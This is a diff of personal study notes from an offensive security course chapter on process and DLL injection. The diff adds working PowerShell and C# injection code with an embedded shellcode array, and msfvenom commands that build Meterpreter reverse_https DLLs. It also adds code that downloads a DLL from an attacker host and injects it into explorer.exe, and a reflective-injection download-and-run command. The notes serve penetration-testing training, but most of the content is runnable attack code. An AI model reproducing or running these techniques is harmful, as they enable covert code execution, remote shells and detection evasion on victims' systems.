@@ -369,7 +369,7 @@ IntPtr.Zero, 0, IntPtr.Zero);
 
 ```
 
-combining both -
+combining both - we can look at ps1 gallery for reference.
 
 ```powershell
 $Kernel32 = @"
@@ -377,26 +377,22 @@ using System;
 using System.Runtime.InteropServices;
 public class Kernel32 {
   [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
- static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int
+ public static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int
 processId);
  [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
- static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint
+ public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint
 dwSize, uint flAllocationType, uint flProtect);
  [DllImport("kernel32.dll")]
- static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress,
+ public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress,
 byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);
  [DllImport("kernel32.dll")]
- static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr
+ public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr
 lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint
 dwCreationFlags, IntPtr lpThreadId);
 }
 "@
 
 Add-Type $Kernel32
-
-#[User32]::MessageBox(0, "This is an alert", "MyBox", 0)
-$hProcess =[Kernel32]::OpenProcess(0x001F0FFF, 0, 4804);
-[IntPtr]$addr = [Kernel32]::VirtualAllocEx($hProcess, [IntPtr]$null, 0x1000, 0x3000, 0x40);
 [Byte[]]$buf =
 0x48,0x31,0xc9,0x48,0x81,0xe9,0xdd,0xff,0xff,0xff,0x48,0x8d,0x05,0xef,0xff,
 0xff,0xff,0x48,0xbb,0xb6,0x91,0x18,0x2b,0x1c,0x05,0x92,0x1b,0x48,0x31,0x58,
@@ -420,9 +416,19 @@ $hProcess =[Kernel32]::OpenProcess(0x001F0FFF, 0, 4804);
 0x94,0x67,0xbc,0x11,0xe3,0xcb,0x69,0x00,0x29,0x5c,0xa5,0xe3,0x77,0x41,0x1c,
 0x5c,0xd3,0x92,0x6c,0x6e,0xcd,0x48,0x7d,0x69,0xf1,0x35,0xd3,0xe9,0x7d,0x2b,
 0x1c,0x05,0x92,0x1b 
-[Kernel32]::WriteProcessMemory($hProcess, $addr, $buf, $buf.Length, $outSize);
-$hThread = [Kernel32]::CreateRemoteThread($hProcess, [intPtr]$null, 0, $addr,
-$null, 0, $null);
+
+$hProcess =[Kernel32]::OpenProcess(0x001F0FFF, 0, 17692);
+Write-Output $hProcess
+Write-Output $buf.Length 
+
+$addr = [Kernel32]::VirtualAllocEx([IntPtr]$hProcess, [IntPtr]::Zero, $buf.Length, 0x3000, 0x40);
+
+[Int32]$lpNumberOfBytesWritten = 0
+[Kernel32]::WriteProcessMemory($hProcess, $addr, $buf, $buf.Length, [ref]$lpNumberOfBytesWritten);
+
+$ThreadId = 0
+$hThread = [Kernel32]::CreateRemoteThread([IntPtr]$hProcess, [IntPtr]::Zero, 0, $addr, [IntPtr]::Zero, 0, [IntPtr]::Zero);
+
 
 ```
 error
@@ -612,5 +618,128 @@ lets try and generate a dll with msfvenom
 ```
 kali@kali:~$ sudo msfvenom -p windows/x64/meterpreter/reverse_https
 LHOST=192.168.119.120 LPORT=443 -f dll -o /var/www/html/met.dll
+
+
+└─$ sudo msfvenom -p windows/x64/meterpreter/reverse_https LHOST=eth0 LPORT=4444 EXIT_FUNC=THREAD -f dll -o /var/www/html/met.dll 
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x64 from the payload
+No encoder specified, outputting raw payload
+Payload size: 652 bytes
+Final size of dll file: 8704 bytes
+Saved as: /var/www/html/met.dll
+
 ```
+
+We will create a chash program that will fetch dll from attackers server. and then we wll write the DLL to disk since LoadLibrary only accepts files present on disk.
+
+NOt able to inject into notepad
+
+able to inject calc-
+
+```
+└─# msfvenom -p windows/x64/exec CMD=calc.exe -f dll -o /var/www/html/calc.dll
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x64 from the payload
+No encoder specified, outputting raw payload
+Payload size: 276 bytes
+Final size of dll file: 8704 bytes
+Saved as: /var/www/html/calc.dll
+
+```
+
+```C#
+using System.Diagnostics;
+using System.Net;
+using System.Runtime.InteropServices;
+using System.Text;
+namespace download_dll
+{
+    class Program
+    {
+        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
+        static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int
+       processId);
+        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
+        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint
+       dwSize, uint flAllocationType, uint flProtect);
+        [DllImport("kernel32.dll")]
+        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress,
+       byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);
+        [DllImport("kernel32.dll")]
+        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr
+       lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint
+       dwCreationFlags, IntPtr lpThreadId);
+        [DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true,
+       SetLastError = true)]
+        static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
+        [DllImport("kernel32.dll", CharSet = CharSet.Auto)]
+        public static extern IntPtr GetModuleHandle(string lpModuleName);
+        static void Main(string[] args)
+        {
+            String dir =
+           Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
+            String dllName = dir + "\\met.dll";
+            WebClient wc = new WebClient();
+            wc.DownloadFile("http://10.10.6.12/met.dll", dllName);
+            Process[] expProc = Process.GetProcessesByName("explorer");
+            Console.WriteLine("Length of the array is : ", (uint) expProc.Length);
+            int pid = expProc[0].Id;
+            Console.WriteLine(pid);
+            IntPtr hProcess = OpenProcess(0x001F0FFF, false, pid);
+            IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, 0x1000, 0x3000, 0x40);
+            IntPtr outSize;
+            Boolean res = WriteProcessMemory(hProcess, addr,
+           Encoding.Default.GetBytes(dllName), dllName.Length, out outSize);
+            IntPtr loadLib = GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");
+            IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, loadLib,
+           addr, 0, IntPtr.Zero);
+        }
+    }
+}
+```
+
+### 5.2.2.1 Exercise
+1. Recreate the DLL injection technique and inject a Meterpreter DLL into explorer.exe from a 
+Jscript file using DotNetToJscript.
+
+# Reflective DLL Injection Theory
+
+Since we do not need to rely on GetProcAddress and want to avoid detection, we are only 
+interested in the memory mapping of the DLL. Reflective DLL injection parses the relevant fields 
+of the DLL’s Portable Executable260 (PE) file format and maps the contents into memory.
+
+In order to implement reflective DLL injection, we could write custom code to essentially recreate 
+and improve upon the functionality of LoadLibrary. Since the inner workings of the code and the 
+details of the PE file format are beyond the scope of this module, we will instead reuse existing 
+code to execute these techniques.
+
+# reflective dll injection in powershell
+
+We’ll reuse the PowerShell reflective DLL injection code (Invoke-ReflectivePEInjection261) 
+developed by the security researchers Joe Bialek and Matt Graeber
+
+https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/CodeExecution/Invoke-ReflectivePEInjection.ps1
+
+Not running -
+
+```
+$bytes = (New-Object System.Net.WebClient).DownloadData('http://10.10.6.12/met.dll')
+$procid = (Get-Process -Name explorer).Id
+
+Import-Module "C:\Users\misthios\codeplay\pen300\book\chapter5\invoke_reflective_injection.ps1" 
+
+Invoke-ReflectivePEInjection -PEBytes $bytes -ProcId $procid
+```
+
+### 5.3.2.1 Exercises
+1. Use Invoke-ReflectivePEInjection to launch a Meterpreter DLL into a remote process and 
+obtain a reverse shell. Note that Invoke-ReflectivePEInjection.ps1 is in the C:\Tools folder on 
+the Windows 10 development VM.
+2. Copy Invoke-ReflectivePEInjection to your Kali Apache web server and create a small 
+PowerShell download script that downloads and executes it directly from memory.
+
+
+
+
+
 
